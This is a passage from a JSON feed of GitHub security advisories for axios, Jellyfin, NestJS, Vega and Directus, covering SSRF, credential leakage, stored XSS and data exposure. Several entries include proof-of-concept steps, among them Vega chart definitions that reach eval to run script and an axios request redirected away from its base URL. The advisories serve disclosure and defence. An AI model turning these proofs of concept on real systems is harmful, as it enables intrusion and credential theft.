<code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>\n<p>It is recommended that:</p>\n<ul>\n<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>\n<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Follow the steps below to reproduce the issue:</p>\n<ol>\n<li>   Set up two simple HTTP servers:</li>\n</ol>\n<pre><code>mkdir /tmp/server1 /tmp/server2\necho \"this is server1\" &gt; /tmp/server1/index.html \necho \"this is server2\" &gt; /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &amp;\npython -m http.server -d /tmp/server2 10002 &amp;\n</code></pre>\n<ol start=\"2\">\n<li>   Create a script (e.g., main.js):</li>\n</ol>\n<pre><code class=\"language-js\">import axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n</code></pre>\n<ol start=\"3\">\n<li>   Run the script:</li>\n</ol>\n<pre><code>$ node main.js\nthis is server2\n</code></pre>\n<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>\n<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>\n<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n<li><a href=\"https://github.com/axios/axios/issues/6463\">https://github.com/axios/axios/issues/6463</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>\n<li><a href=\"https://github.com/axios/axios/releases/tag/v1.8.2\">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27152\">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>\n<li><a href=\"https://github.com/axios/axios/pull/6829\">https://github.com/axios/axios/pull/6829</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde\">https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6",
            "title": "[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
            "date_modified": "2025-03-28T14:57:53.000Z",
            "date_published": "2025-03-07T15:16:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Jellyfin 10.8.x through 10.8.3, the name of a playlist is vulnerable to stored XSS. This allows an attacker to steal access tokens from the localStorage of the victim.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23636\">https://nvd.nist.gov/vuln/detail/CVE-2023-23636</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin-web/issues/3788\">https://github.com/jellyfin/jellyfin-web/issues/3788</a></li>\n<li><a href=\"https://herolab.usd.de/security-advisories\">https://herolab.usd.de/security-advisories</a></li>\n<li><a href=\"https://herolab.usd.de/security-advisories/usd-2022-0030\">https://herolab.usd.de/security-advisories/usd-2022-0030</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin-web/pull/3789\">https://github.com/jellyfin/jellyfin-web/pull/3789</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4\">https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2h5r-cqfc-45v6\">https://github.com/advisories/GHSA-2h5r-cqfc-45v6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2h5r-cqfc-45v6",
            "title": "[jellyfin-web] Jellyfin Web Cross-Site Scripting (XSS) via Playlist Name",
            "date_modified": "2025-03-27T21:18:24.000Z",
            "date_published": "2023-02-03T03:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2h5r-cqfc-45v6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Jellyfin 10.8.x through 10.8.3, the name of a collection is vulnerable to stored XSS. This allows an attacker to steal access tokens from the localStorage of the victim.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23635\">https://nvd.nist.gov/vuln/detail/CVE-2023-23635</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin-web/issues/3788\">https://github.com/jellyfin/jellyfin-web/issues/3788</a></li>\n<li><a href=\"https://herolab.usd.de/security-advisories\">https://herolab.usd.de/security-advisories</a></li>\n<li><a href=\"https://herolab.usd.de/security-advisories/usd-2022-0031\">https://herolab.usd.de/security-advisories/usd-2022-0031</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin-web/pull/3789\">https://github.com/jellyfin/jellyfin-web/pull/3789</a></li>\n<li><a href=\"https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4\">https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-749c-pc87-4qcw\">https://github.com/advisories/GHSA-749c-pc87-4qcw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-749c-pc87-4qcw",
            "title": "[jellyfin-web] Jellyfin Web Cross-Site Scripting (XSS) via Collection Name",
            "date_modified": "2025-03-27T21:18:05.000Z",
            "date_published": "2023-02-03T03:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-749c-pc87-4qcw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>File Upload vulnerability in nestjs nest v.11.0.11 allows a remote attacker to execute arbitrary code via the Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29409\">https://nvd.nist.gov/vuln/detail/CVE-2024-29409</a></li>\n<li><a href=\"https://github.com/nestjs/nest/issues/13311#issuecomment-1993839495\">https://github.com/nestjs/nest/issues/13311#issuecomment-1993839495</a></li>\n<li><a href=\"https://gist.github.com/aydinnyunus/801342361584d1491c67a820a714f53f\">https://gist.github.com/aydinnyunus/801342361584d1491c67a820a714f53f</a></li>\n<li><a href=\"https://github.com/nestjs/nest/blob/83a48b2c7396985144b7a6cd5d3bee1abb7c5d81/packages/common/pipes/file/file-type.validator.ts#L19\">https://github.com/nestjs/nest/blob/83a48b2c7396985144b7a6cd5d3bee1abb7c5d81/packages/common/pipes/file/file-type.validator.ts#L19</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cj7v-w2c7-cp7c\">https://github.com/advisories/GHSA-cj7v-w2c7-cp7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cj7v-w2c7-cp7c",
            "title": "[@nestjs/common] nest allows a remote attacker to execute arbitrary code via the Content-Type header",
            "date_modified": "2025-03-27T21:13:50.000Z",
            "date_published": "2025-03-14T18:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cj7v-w2c7-cp7c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impact\">Impact</h2>\n<p>Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the <code>vega-interpreter</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<ul>\n<li>Use <code>vega</code> with <a href=\"https://vega.github.io/vega/usage/interpreter/\">expression interpreter</a></li>\n<li>Upgrade to a <a href=\"https://github.com/vega/vega/releases/tag/v5.32.0\">newer Vega version</a> (<code>5.32.0</code>)</li>\n</ul>\n<h3 id=\"poc-summary\">POC Summary</h3>\n<p>Calling <code>replace</code> with a <code>RegExp</code>-like pattern calls <code>RegExp.prototype[@@replace]</code>, which can then call an attacker-controlled <code>exec</code> function.</p>\n<h3 id=\"poc-details\">POC Details</h3>\n<p>Consider the function call <code>replace('foo', {__proto__: /h/.constructor.prototype, global: false})</code>. Since <code>pattern</code> has <code>RegExp.prototype[@@replace]</code>, <code>pattern.exec('foo')</code> winds up being called.</p>\n<p>The resulting malicious call looks like this:</p>\n<pre><code>replace(&lt;string argument&gt;, {__proto__: /h/.constructor.prototype, exec: &lt;function&gt;, global: false})\n</code></pre>\n<p>Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse <code>event.view</code> to gain access to <code>eval</code>.</p>\n<h3 id=\"reproduction-steps\">Reproduction steps</h3>\n<pre><code>{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"on\":[{\"events\":\"body:mousemove{99999}\",\"update\":\"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})\"}]}]}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf\">https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27793\">https://nvd.nist.gov/vuln/detail/CVE-2025-27793</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966\">https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966</a></li>\n<li><a href=\"https://github.com/vega/vega/releases/tag/v5.32.0\">https://github.com/vega/vega/releases/tag/v5.32.0</a></li>\n<li><a href=\"https://vega.github.io/vega/usage/interpreter\">https://vega.github.io/vega/usage/interpreter</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-963h-3v39-3pqf\">https://github.com/advisories/GHSA-963h-3v39-3pqf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-963h-3v39-3pqf",
            "title": "[vega-functions] Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]",
            "date_modified": "2025-03-27T18:00:25.000Z",
            "date_published": "2025-03-27T18:00:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-963h-3v39-3pqf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impact\">Impact</h2>\n<p>Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the <code>vega-interpreter</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<ul>\n<li>Use <code>vega</code> with <a href=\"https://vega.github.io/vega/usage/interpreter/\">expression interpreter</a></li>\n<li>Upgrade to a <a href=\"https://github.com/vega/vega/releases/tag/v5.32.0\">newer Vega version</a> (<code>5.32.0</code>)</li>\n</ul>\n<h3 id=\"poc-summary\">POC Summary</h3>\n<p>Calling <code>replace</code> with a <code>RegExp</code>-like pattern calls <code>RegExp.prototype[@@replace]</code>, which can then call an attacker-controlled <code>exec</code> function.</p>\n<h3 id=\"poc-details\">POC Details</h3>\n<p>Consider the function call <code>replace('foo', {__proto__: /h/.constructor.prototype, global: false})</code>. Since <code>pattern</code> has <code>RegExp.prototype[@@replace]</code>, <code>pattern.exec('foo')</code> winds up being called.</p>\n<p>The resulting malicious call looks like this:</p>\n<pre><code>replace(&lt;string argument&gt;, {__proto__: /h/.constructor.prototype, exec: &lt;function&gt;, global: false})\n</code></pre>\n<p>Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse <code>event.view</code> to gain access to <code>eval</code>.</p>\n<h3 id=\"reproduction-steps\">Reproduction steps</h3>\n<pre><code>{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"on\":[{\"events\":\"body:mousemove{99999}\",\"update\":\"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})\"}]}]}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf\">https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27793\">https://nvd.nist.gov/vuln/detail/CVE-2025-27793</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966\">https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966</a></li>\n<li><a href=\"https://github.com/vega/vega/releases/tag/v5.32.0\">https://github.com/vega/vega/releases/tag/v5.32.0</a></li>\n<li><a href=\"https://vega.github.io/vega/usage/interpreter\">https://vega.github.io/vega/usage/interpreter</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-963h-3v39-3pqf\">https://github.com/advisories/GHSA-963h-3v39-3pqf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-963h-3v39-3pqf",
            "title": "[vega] Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]",
            "date_modified": "2025-03-27T18:00:25.000Z",
            "date_published": "2025-03-27T18:00:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-963h-3v39-3pqf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In <code>vega</code> 5.30.0 and lower,  <code>vega-functions</code> 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <code>vega</code> <code>5.31.0</code>  / <code>vega-functions</code> <code>5.16.0</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<ul>\n<li>Run <code>vega</code> without <code>vega.expressionInterpreter</code>. This mode is not the default as it is slower. </li>\n<li>Using the interpreter <a href=\"https://vega.github.io/vega/usage/interpreter/\">described in CSP safe mode</a> (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported to Vega-Lite by @kprevas Nov 8 2024 in <a href=\"https://github.com/vega/vega-lite/issues/9469\">https://github.com/vega/vega-lite/issues/9469</a> &amp;  <a href=\"https://github.com/vega/vega/issues/3984\">https://github.com/vega/vega/issues/3984</a></li>\n</ul>\n<p>Reproduction of the error in Vega by @mattijn </p>\n<pre><code>{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"signals\": [\n    {\n      \"name\": \"inject_alert\",\n      \"on\": [\n        {\n          \"events\": [\n            {\n              \"type\": \"mousedown\",\n              \"marktype\": \"rect\",\n              \"filter\": [\"scale(event.view.setTimeout, 'alert(\\\"alert\\\")')\"]\n            }\n          ],\n          \"update\": \"datum\"\n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"type\": \"rect\",\n      \"encode\": {\n        \"update\": {\n          \"x\": {\"value\": 0},\n          \"y\": {\"value\": 0},\n          \"width\": {\"value\": 100},\n          \"height\": {\"value\": 100}\n        }\n      }\n    }\n  ]\n}\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr\">https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr</a></li>\n<li><a href=\"https://github.com/vega/vega-lite/issues/9469\">https://github.com/vega/vega-lite/issues/9469</a></li>\n<li><a href=\"https://github.com/vega/vega/issues/3984\">https://github.com/vega/vega/issues/3984</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c\">https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26619\">https://nvd.nist.gov/vuln/detail/CVE-2025-26619</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rcw3-wmx7-cphr\">https://github.com/advisories/GHSA-rcw3-wmx7-cphr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rcw3-wmx7-cphr",
            "title": "[vega-functions] Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter",
            "date_modified": "2025-03-27T23:29:48.000Z",
            "date_published": "2025-03-27T14:12:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rcw3-wmx7-cphr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In <code>vega</code> 5.30.0 and lower,  <code>vega-functions</code> 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <code>vega</code> <code>5.31.0</code>  / <code>vega-functions</code> <code>5.16.0</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<ul>\n<li>Run <code>vega</code> without <code>vega.expressionInterpreter</code>. This mode is not the default as it is slower. </li>\n<li>Using the interpreter <a href=\"https://vega.github.io/vega/usage/interpreter/\">described in CSP safe mode</a> (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported to Vega-Lite by @kprevas Nov 8 2024 in <a href=\"https://github.com/vega/vega-lite/issues/9469\">https://github.com/vega/vega-lite/issues/9469</a> &amp;  <a href=\"https://github.com/vega/vega/issues/3984\">https://github.com/vega/vega/issues/3984</a></li>\n</ul>\n<p>Reproduction of the error in Vega by @mattijn </p>\n<pre><code>{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"signals\": [\n    {\n      \"name\": \"inject_alert\",\n      \"on\": [\n        {\n          \"events\": [\n            {\n              \"type\": \"mousedown\",\n              \"marktype\": \"rect\",\n              \"filter\": [\"scale(event.view.setTimeout, 'alert(\\\"alert\\\")')\"]\n            }\n          ],\n          \"update\": \"datum\"\n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"type\": \"rect\",\n      \"encode\": {\n        \"update\": {\n          \"x\": {\"value\": 0},\n          \"y\": {\"value\": 0},\n          \"width\": {\"value\": 100},\n          \"height\": {\"value\": 100}\n        }\n      }\n    }\n  ]\n}\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr\">https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr</a></li>\n<li><a href=\"https://github.com/vega/vega-lite/issues/9469\">https://github.com/vega/vega-lite/issues/9469</a></li>\n<li><a href=\"https://github.com/vega/vega/issues/3984\">https://github.com/vega/vega/issues/3984</a></li>\n<li><a href=\"https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c\">https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26619\">https://nvd.nist.gov/vuln/detail/CVE-2025-26619</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rcw3-wmx7-cphr\">https://github.com/advisories/GHSA-rcw3-wmx7-cphr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rcw3-wmx7-cphr",
            "title": "[vega] Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter",
            "date_modified": "2025-03-27T23:29:48.000Z",
            "date_published": "2025-03-27T14:12:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rcw3-wmx7-cphr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"describe-the-bug\">Describe the Bug</h3>\n<p> In Directus, when a <strong>Flow</strong> with the \"<em>Webhook</em>\" trigger and the \"<em>Data of Last Operation</em>\" response body encounters a ValidationError thrown by a failed condition operation, the API response includes sensitive data. This includes environmental variables, sensitive API keys, user accountability information, and operational data.</p>\n<p>This issue poses a significant security risk, as any unintended exposure of this data could lead to potential misuse.</p>\n<p><img alt=\"Image\" src=\"https://github.com/user-attachments/assets/fb894347-cd10-4e79-9469-8fc1b2289794\">\n<img alt=\"Image\" src=\"https://github.com/user-attachments/assets/a20337a2-005f-4cfd-ba30-fc5f579ed6c4\">\n<img alt=\"Image\" src=\"https://github.com/user-attachments/assets/9b776248-4a20-46f0-92a4-3760d8e53df9\"></p>\n<h3 id=\"to-reproduce\">To Reproduce</h3>\n<p><strong>Steps to Reproduce:</strong></p>\n<ol>\n<li>Create a Flow in Directus with:<ul>\n<li>Trigger: Webhook</li>\n<li>Response Body: Data of Last Operation</li>\n</ul>\n</li>\n<li>Add a condition that is likely to fail.</li>\n<li>Trigger the Flow with any input data that will fail the condition.</li>\n<li>Observe the API response, which includes sensitive information like:<ul>\n<li>Environmental variables (<code>$env</code>)</li>\n<li>Authorization headers</li>\n<li>User details under <code>$accountability</code></li>\n<li>Previous operational data.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Expected Behavior:</strong>\nIn the event of a ValidationError, the API response should only contain relevant error messages and details, avoiding the exposure of sensitive data.</p>\n<p><strong>Actual Behavior:</strong>\nThe API response includes sensitive information such as:</p>\n<ul>\n<li>Environment keys (<code>FLOWS_ENV_ALLOW_LIST</code>)</li>\n<li>User accountability (<code>role</code>, <code>user</code>, etc.)</li>\n<li>Operational logs (<code>current_payments</code>, <code>$last</code>), which might contain private details.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-fm3h-p9wm-h74h\">https://github.com/directus/directus/security/advisories/GHSA-fm3h-p9wm-h74h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30353\">https://nvd.nist.gov/vuln/detail/CVE-2025-30353</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fm3h-p9wm-h74h\">https://github.com/advisories/GHSA-fm3h-p9wm-h74h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fm3h-p9wm-h74h",
            "title": "[directus] Directus's webhook trigger flows can leak sensitive data",
            "date_modified": "2025-03-26T20:10:03.000Z",
            "date_published": "2025-03-26T20:08:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fm3h-p9wm-h74h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>search</code> query parameter allows users with access to a collection to filter items based on fields they do not have permission to view. This allows the enumeration of unknown field contents.</p>\n<h3 id=\"details\">Details</h3>\n<p>The searchable columns (numbers &amp; strings) are not checked against permissions when injecting the <code>where</code> clauses for applying the search query. This leads to the possibility of enumerating those un-permitted fields.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a collection with a string / numeric field, configure the permissions for the public role to not include the field created</li>\n<li>Create items with identifiable content in the not permitted field</li>\n<li>Query the collection and include the field content in the <code>search</code> parameter</li>\n<li>See that results are returned, even tho the public user does not have permission to view the field content</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is a very high impact, as for example Directus instances which allow public read access to the user avatar are vulnerable to have the email addresses, password hashes and potentially admin level access tokens extracted. The admin token and password hash extraction have a caveat, as string fields are only searched with a lower cased version of the search query.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c\">https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30352\">https://nvd.nist.gov/vuln/detail/CVE-2025-30352</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d\">https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7wq3-jr35-275c\">https://github.com/advisories/GHSA-7wq3-jr35-275c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7wq3-jr35-275c",
            "title": "[directus] Directus `search` query parameter allows enumeration of non permitted fields",
            "date_modified": "2025-03-26T18:44:25.000Z",
            "date_published": "2025-03-26T18:44:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7wq3-jr35-275c"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}